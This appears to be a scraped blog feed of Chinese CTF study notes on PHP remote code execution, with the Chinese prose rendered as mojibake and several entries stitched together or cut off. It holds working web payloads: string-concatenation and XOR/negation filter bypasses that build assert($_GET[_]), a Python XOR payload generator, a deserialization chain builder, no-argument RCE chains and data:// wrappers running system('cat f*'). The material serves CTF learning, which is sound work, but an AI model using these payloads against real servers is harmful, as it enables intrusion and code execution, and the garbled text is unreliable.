æŒ‰ç´¢å¼•é¡ºåºä¸ºå‚æ•°è°ƒç”¨callbackåçš„ç»“æœï¼ˆæœ‰æ›´å¤šæ•°ç»„æ—¶ï¼Œè¿˜ä¼šä¼ å…¥arraysçš„å…ƒç´ ï¼‰ã€‚ callbackå‡½æ•°å½¢å‚çš„æ•°é‡å¿…é¡»åŒ¹é…array_map()å®å‚ä¸­æ•°ç»„çš„æ•°é‡ã€‚</p><p><img src="5.PNG"></p><li>call_user_func()<blockquote><p>call_user_func ( callable $callback [, mixed $parameter [, mixed $â€¦ ]] ) : mixed</p></blockquote><p><img src="6.PNG"></p><li>call_user_func_array()<p>åŒarray_map()</p><p><img src="7.PNG"></p><li>array_filterç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„çš„å•å…ƒ<blockquote><p>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</p></blockquote><p>ä¾æ¬¡å°†arrayæ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ°callbackå‡½æ•°ã€‚å¦‚æœcallbackå‡½æ•°è¿”å›trueï¼Œåˆ™arrayæ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚</p><p><img src="8.PNG"><br>æ³¨æ„ä¸€ä¸‹ï¼Œå®ƒç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯callbackå‡½æ•°</p><li>usort()<p>ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åº</p><blockquote><p>usort ( array &amp;$array , callable $value_compare_func ) : bool</p></blockquote><p>æœ¬å‡½æ•°å°†ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹ä¸€ä¸ªæ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºã€‚ å¦‚æœè¦æ’åºçš„æ•°ç»„éœ€è¦ç”¨ä¸€ç§ä¸å¯»å¸¸çš„æ ‡å‡†è¿›è¡Œæ’åºï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨æ­¤å‡½æ•°ã€‚</p><p><img src="9.PNG"></p><p>å½“PHP &gt;= 5.6 &amp; PHP &lt; 7æ—¶ï¼Œphpæœ‰ä¸€ä¸ªå‚æ•°å˜é•¿ç‰¹æ€§</p><p><img src="10.PNG"></p><h2>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h2><p><img src="11.PNG"></p><p><img src="12.PNG"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>åœ¨PHPä¸­ä¸ä¸€å®šéœ€è¦å¼•å·(å•å¼•å·/åŒå¼•å·)æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚PHPæ”¯æŒæˆ‘ä»¬å£°æ˜å…ƒç´ çš„ç±»å‹ï¼Œæ¯”å¦‚$name = (string)mochu7;ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ$nameå°±åŒ…å«å­—ç¬¦ä¸²â€mochu7â€ï¼Œæ­¤å¤–ï¼Œå¦‚æœä¸æ˜¾ç¤ºå£°æ˜ç±»å‹ï¼Œé‚£ä¹ˆPHPä¼šå°†åœ†æ‹¬å·å†…çš„æ•°æ®å½“æˆå­—ç¬¦ä¸²æ¥å¤„ç†</p><p><img src="13.PNG"></p><p>è¿™ç«Ÿç„¶å¯ä»¥ä¸åŠ â€˜â€™ï¼Œ!!!</p><h2>å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡</h2>>é€‚ç”¨phpç‰ˆæœ¬ï¼šphp>=7<p>ä»¥å…«è¿›åˆ¶è¡¨ç¤ºçš„[0â€“7]{1,3}è½¬ä¹‰å­—ç¬¦ä¼šè‡ªåŠ¨é€‚é…byteï¼ˆå¦‚â€\400â€ == â€œ\000â€ï¼‰</p><p>ä»¥åå…­è¿›åˆ¶çš„\x[0â€“9A-Fa-f]{1,2}è½¬ä¹‰å­—ç¬¦è¡¨ç¤ºæ³•ï¼ˆå¦‚â€œ\x41â€ï¼‰</p><p>ä»¥Unicodeè¡¨ç¤ºçš„\u{[0â€“9A-Fa-f]+}å­—ç¬¦ï¼Œä¼šè¾“å‡ºä¸ºUTF-8å­—ç¬¦ä¸²</p><p>æ³¨æ„è¿™é‡Œè½¬ä¹‰åçš„å­—ç¬¦å¿…é¡»åŒå¼•å·åŒ…è£¹ä¼ å‚</p><p><img src="14.PNG"></p><p>å¦å¤–ï¼Œå…«è¿›åˆ¶çš„æ–¹æ³•å¯ä»¥ç»•è¿‡æ— å­—æ¯ä¼ å‚è¿›è¡Œä»£ç æ‰§è¡Œ</p><h2>å¤šæ¬¡ä¼ å‚ç»•è¿‡</h2><blockquote><p>é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶</p></blockquote><p>å¦‚æœè¿‡æ»¤äº†å¼•å·(å•å¼•å·/åŒå¼•å·)ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡</p><p><img src="15.PNG"><br><img src="16.PNG"></p><p>postå’Œgetä¸¤ç§æ–¹å¼</p><p>å¦‚æœâ€™.â€™ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå°±æ˜¯å‰é¢è¯´çš„ï¼ˆphpin.foï¼‰();è¿™ç§åšæ³•</p><p>å¦å¤–å¦‚æœç¢°åˆ°å‚æ•°é•¿åº¦å—é™åˆ¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡ä¼ å‚çš„æ–¹æ³•ç»•è¿‡å‚æ•°é•¿åº¦é™åˆ¶æˆ–è€…å›è°ƒå‡½æ•°</p><p><img src="17.PNG"><br><img src="18.PNG"></p><p>å›è°ƒå‡½æ•°å¯èƒ½å¤§éƒ¨åˆ†çœ‹é™åˆ¶çš„å…·ä½“é•¿åº¦ï¼Œä½†æ˜¯åœ¨PHP &gt;= 5.6 &amp; PHP &lt; 7æ—¶å¯¹ä»¥ä¸Šè¿‡æ»¤æ–¹æ³•å¯ä»¥ç»•è¿‡</p><p><img src="19.PNG"></p><h2>å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡</h2><blockquote><p>é€‚ç”¨äºPHPç‰ˆæœ¬ï¼šWindowsæœ¬åœ°æµ‹è¯•çš„æ˜¯PHP&gt;=7å¯ä»¥æˆåŠŸï¼ŒPHP5æµ‹è¯•è™½ç„¶æŠ¥é”™ä½†æ˜¯å¹¶ä¸è‚¯å®šä¸èƒ½ä½¿ç”¨</p></blockquote><p>æµ‹è¯•ç‰ˆæœ¬æ˜¯php 7.4.3</p><p><img src="21.PNG"></p><p><img src="20.PNG"></p><p>ä¸çŸ¥é“ä¸ºå•¥åé¢é‚£ä¸ªæ‹¼æ¥çš„å‘½ä»¤æ‰§è¡Œä¸äº†</p><p><img src="22.png"></p><p>get_definded_functions()[internal][266]();</p><p><img src="23.PNG"></p><p><img src="24.PNG"></p><h2>å¼‚æˆ–ç»•è¿‡</h2>>é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶<p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²å¼‚æˆ–ä¹‹åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><img src="25.PNG"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å­—ç¬¦ï¼š?         ASCIIç ï¼š63           äºŒè¿›åˆ¶ï¼š  0011 1111</span><br><span class="line">å­—ç¬¦ï¼š~         ASCIIç ï¼š126          äºŒè¿›åˆ¶ï¼š  0111 1110</span><br><span class="line">å¼‚æˆ–è§„åˆ™ï¼š</span><br><span class="line">1   XOR   0   &#x3D;   1</span><br><span class="line">0   XOR   1   &#x3D;   1</span><br><span class="line">0   XOR   0   &#x3D;   0</span><br><span class="line">1   XOR   1   &#x3D;   0</span><br><span class="line">ä¸Šè¿°ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¾—åˆ° äºŒè¿›åˆ¶ï¼š  0100 0001</span><br><span class="line">è¯¥äºŒè¿›åˆ¶çš„åè¿›åˆ¶ä¹Ÿå°±æ˜¯ï¼š65</span><br><span class="line">å¯¹åº”çš„ASCIIç æ˜¯ï¼šA</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹ä¸€åˆ°ä¾‹é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;, $_GET[&#39;shell&#39;]))&#123;</span><br><span class="line">echo &quot;hacker!!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ‰€æœ‰è‹±æ–‡å­—æ¯å’Œæ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ASCIIç ä¸­è¿˜æœ‰å¾ˆå¤šå­—æ¯æ•°å­—ä¹‹å¤–çš„å­—ç¬¦ï¼Œåˆ©ç”¨è¿™äº›å­—ç¬¦è¿›è¡Œå¼‚æˆ–å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</p><blockquote><p>PSï¼šå–ASCIIè¡¨ç§éå­—æ¯æ•°å­—çš„å…¶ä»–å­—ç¬¦ï¼Œè¦æ³¨æ„æœ‰äº›å­—ç¬¦å¯èƒ½ä¼šå½±å“æ•´ä¸ªè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥è¦å»æ‰å¦‚ï¼šåå¼•å·ï¼Œå•å¼•å·</p></blockquote><p>å¼‚æˆ–è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;assert&quot;</span><br><span class="line">strlist &#x3D; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]</span><br><span class="line">#strlistæ˜¯asciiè¡¨ä¸­æ‰€æœ‰éå­—æ¯æ•°å­—çš„å­—ç¬¦åè¿›åˆ¶</span><br><span class="line">str1,str2 &#x3D; &#39;&#39;,&#39;&#39;</span><br><span class="line"></span><br><span class="line">for char in payload:</span><br><span class="line">  for i in strlist:</span><br><span class="line">      for j in strlist:</span><br><span class="line">          if(i ^ j &#x3D;&#x3D; ord(char)):</span><br><span class="line">              i &#x3D; &#39;%&#123;:0&gt;2&#125;&#39;.format(hex(i)[2:])</span><br><span class="line">              j &#x3D; &#39;%&#123;:0&gt;2&#125;&#39;.format(hex(j)[2:])</span><br><span class="line">              print(&quot;(&#39;&#123;0&#125;&#39;^&#39;&#123;1&#125;&#39;)&quot;.format(i,j),end&#x3D;&quot;.&quot;)</span><br><span class="line">               break</span><br><span class="line">      else:</span><br><span class="line">          continue</span><br><span class="line">      break</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€æ¬¡ä»£ç æ‰§è¡Œåªèƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œè¯­å¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸èƒ½æ‰§è¡Œè¯­å¥ï¼Œæ‰€ä»¥éœ€è¦æ‰§è¡Œä¸¤æ¬¡ä»£ç æ‰§è¡Œï¼Œæ„é€ </p><blockquote><p>assert($<em>GET[</em>]);</p></blockquote><p>ä½¿ç”¨è„šæœ¬å¯¹æ¯ä¸ªå­—æ¯è¿›è¡Œè½¬æ¢ï¼Œç„¶åæ‹¼æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);</span><br><span class="line">&#x2F;&#x2F;$_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);</span><br><span class="line">&#x2F;&#x2F;$__&#x3D;&#39;_GET&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">&#x2F;&#x2F;$___&#x3D;&#39;$_GET&#39;;</span><br><span class="line">$_($___[_]);</span><br><span class="line">&#x2F;&#x2F;assert($_GET[_]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    payload: $_=(&#39;%01&#39;^&#39;%60&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7b&#39;).(&#39;%05&#39;^&#39;%60&#39;).(&#39;%09&#39;^&#39;%7b&#39;).(&#39;%08&#39;^&#39;%7c&#39;);$__=&#39;_&#39;.(&#39;%07&#39;^&#39;%40&#39;).(&#39;%05&#39;^&#39;%40&#39;).(&#39;%09&#39;^&#39;%5d&#39;);$___=$$__;$_($___[_]);&amp;_=phpinfo();</code></pre><p><img src="26.PNG"></p><p>å†æ”¾ä¸ªç½‘ä¸Šçœ‹åˆ°çš„payload</p><p><img src="30.PNG"></p><h2>URLç¼–ç å–åç»•è¿‡</h2><p>php -r â€œvar_dump(urlencode(~â€™phpinfoâ€™));â€</p><p><img src="27.PNG"></p><p><img src="28.PNG"></p><p>å½“5&lt;=PHP&lt;=7.0.9æ—¶ï¼Œéœ€è¦å†æ‰§è¡Œä¸€æ¬¡æ„é€ å‡ºæ¥çš„å­—ç¬¦ï¼Œæ‰€ä»¥å‚è€ƒä¸Šé¢é‚£ç§å¼‚æˆ–æ‹¼æ¥çš„æ–¹æ³•</p><pre><code>    $_=(~&#39;%9E%8C%8C%9A%8D%8B&#39;);$__=&#39;_&#39;.(~&#39;%AF%B0%AC%AB&#39;);$___=$$__;$_($___[_]);    #assert($_GET[_]);</code></pre><p><img src="29.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®éªŒå®¤ååºåˆ—åŒ–</title>
      <link href="/2021/03/25/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/03/25/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">   public $A1;</span><br><span class="line">   public $A2;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">   public $B1;</span><br><span class="line">   public $B2;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">public $C1;</span><br><span class="line">   public $C2;</span><br><span class="line">   public $C3;</span><br><span class="line">&#125;</span><br><span class="line">class D</span><br><span class="line">&#123;</span><br><span class="line">   public $D1&#x3D;&#39;phpinfo();&#39;;</span><br><span class="line">       </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">   public $E1;</span><br><span class="line">   public $E2&#x3D;&#39;FLAG&#39;;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;new B();</span><br><span class="line">$a-&gt;B1&#x3D;new A();</span><br><span class="line">$a-&gt;B1-&gt;A2&#x3D;array(&#39;godmi&#39;&#x3D;&gt;new C());</span><br><span class="line">$a-&gt;B1-&gt;A2[&#39;godmi&#39;]-&gt;C3&#x3D;new E();</span><br><span class="line">$a-&gt;B1-&gt;A2[&#39;godmi&#39;]-&gt;C3-&gt;E1&#x3D;new D();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo(urlencode(serialize($a)));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ— å‚rceæ€»ç»“</title>
      <link href="/2021/03/23/rce%E6%80%BB%E7%BB%93/"/>
      <url>/2021/03/23/rce%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>rceæ— å‚æ•°è¿™ä¸ªä¸œè¥¿åœ¨å¾ˆæ—©ä¹‹å‰å°±æœ‰æ¥è§¦ï¼Œä½†æ˜¯æ€»æ˜¯è®°ä¸ä½è¯­å¥ï¼Œå€Ÿæ­¤å¯¹rceæ— å‚æ•°è¿›è¡Œä¸€ä¸ªæ›´åŠ å…·ä½“çš„ç†è§£</p><span id="more"></span><h2>ä¾‹å­1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">   if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;  </span><br><span class="line">       if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">           if (!preg_match(&#39;&#x2F;na|info|dec|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">               @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">           &#125;</span><br><span class="line">           else&#123;</span><br><span class="line">               die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       else&#123;</span><br><span class="line">           die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">       die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡è¦ä»£ç </p><blockquote><p>/[^\W]+((?R)?)/</p><p>(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚å…è®¸æ‰§è¡Œç±»ä¼¼a(b(c()))æ ¼å¼çš„æ— å‚æ•°å‡½æ•°ï¼›</p></blockquote><h3>æ–¹æ³•ï¼ˆä¸€ï¼‰</h3><p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><blockquote><?php print_r(scandir("."));?></blockquote><p><img src="1.PNG"></p><p><img src="2.PNG"></p><p>å°±æ˜¯ä¹‹å‰çš„ä¸å¤§æ‡‚å¾—scandir(â€œ.â€)å’Œscandir(â€œ/â€œ),â€œ.â€è¡¨ç¤ºçš„æ˜¯å½“å‰ç›®å½•ä¸Šçš„æ‰€æœ‰æ–‡ä»¶ï¼Œâ€/â€œè¡¨ç¤ºçš„æ˜¯æ ¹ç›®å½•</p><blockquote><?php print_r(scandir("../"));?></blockquote><p><img src="3.PNG"></p><p>æœ‰ä¸Šæˆ‘ä»¬å¯ä»¥çŸ¥é“å¯ä»¥åˆ©ç”¨print_r(scandir)å»è¿›è¡ŒæŸ¥æ‰¾ä½ç½®ï¼Œï¼ˆscandir() å‡½æ•°<mark>è¿”å›</mark>æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚å› ä¸ºæ˜¯è¿”å›ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨print_rè¿›è¡Œè¾“å‡ºï¼‰</p><p>ä½†æ˜¯ï¼ï¼ï¼å› ä¸ºå­˜åœ¨/[^\W]+((?R)?)/ï¼Œæ‰€ä»¥</p><p><a href="https://regex101.com/">æ­£åˆ™åŒ¹é…ç½‘å€</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹</p><p><img src="4.PNG"></p><p><img src="5.PNG"></p><p> if(â€˜;â€™ === preg_replace(â€˜/[^\W]+((?R)?)/â€˜, â€˜â€™, $_GET[â€˜expâ€™]))</p><p>å¦‚æœæˆ‘ä»¬è¾“å…¥print_r(scandir())çš„æ—¶å€™ï¼Œå…¨éƒ¨è¢«åŒ¹é…ä¸Šï¼Œç„¶åå°†å…¶è½¬æ¢ä¸ºç©ºæ ¼ï¼Œæœ€ååªå‰©ä¸‹â€œï¼›â€,å¦‚æœä¸ºçœŸæˆåŠŸæ‰§è¡Œä¸‹ä¸€æ­¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowå‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2021/03/23/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/03/23/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>å­¦ä¹ å‘½ä»¤æ‰§è¡Œ</p><span id="more"></span><h2>web 39</h2><p>å°tipsï¼Œçœ‹åˆ°includeè¦æƒ³åˆ°ä¼ªåè®®</p><p>å…ˆå¯¹dataåè®®è¿›è¡Œä¸€ä¸ªå¤ä¹ </p><p><img src="1.PNG"></p><p><img src="2.PNG"></p><p>data://text/plain,&lt;&gt;</p><p>data://text/plain;base64,</p><p><img src="3.PNG"></p><p>çœ‹è§include,å°±æƒ³åˆ°äº†ä¼ªåè®®ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagè¢«è¿‡æ»¤äº†</p><p>å¦‚æœæˆ‘ä»¬é‡‡ç”¨æœ€å¸¸ç”¨çš„php://filterä¼ªåè®®</p><p>æˆ‘ä»¬å†™é“php://filter/read=convert.base64-encode/resource=â€flag.phpâ€,flagè¢«è¿‡æ»¤</p><p>é‡‡ç”¨data</p><p>data://text/plain,<?php system("cat f*");?><br>data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==(è¿™ä¸ªæ— æ³•å›æ˜¾)</p><p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå‡ºflag.phpçš„ç•Œé¢</p><p><img src="4.PNG"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°.php,ç›´æ¥æ˜¾ç¤ºåœ¨htmlä¸Šï¼Œå› ä¸ºè¿™ä¸ª&lt;&gt;,ç›´æ¥åœ¨åé¢å½¢æˆé—­åˆï¼Œæ‰€æœ‰åé¢çš„.phpå¯¹æˆ‘ä»¬çš„è¯­å¥æ²¡æœ‰å½±å“</p><h2>web 40</h2><p>æ— å‚æ•°rce.</p><p><img src="5.PNG"></p><p>?c=print_r(scandir(current(localeconv())));</p><p>?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web174</title>
      <link href="/2021/03/22/ctfshow-web174/"/>
      <url>/2021/03/22/ctfshow-web174/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ‰“å¼€è¾“å…¥ä¸€ä¸ªæ•°å­—éƒ½æ˜¾ç¤ºä¸å‡ºæ¥ä»»ä½•ä¸œè¥¿ï¼Œå°è¯•æŠ“åŒ…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Easyphp</title>
      <link href="/2021/03/22/GYCTF2020-Easyphp/"/>
      <url>/2021/03/22/GYCTF2020-Easyphp/</url>
      
